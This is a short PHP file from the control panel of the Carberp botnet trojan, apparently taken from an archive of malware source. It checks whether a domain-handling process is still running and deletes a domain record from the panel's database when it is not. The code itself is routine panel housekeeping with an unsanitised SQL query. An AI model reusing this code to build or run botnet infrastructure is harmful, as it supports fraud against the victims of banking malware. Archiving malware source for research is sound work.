/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
<?php

function check_pid(){
    if(file_exists('cache/domains.pid')){
        $pid = file_get_contents('cache/domains.pid');
        if(stripos(exec('ps -p '.$pid), $pid) === false){
	    return false;
        }else{
            return true;
        }
    }else{
        return false;
    }
}

$check = check_pid();

if($check != true){
    if(!empty($Cur['id'])){
        $mysqli->query('delete from bf_domains WHERE (id = \''.$Cur['id'].'\') LIMIT 1');
    }
}

header('Location: /autosys/domains.html?ajax=1');
exit;

?>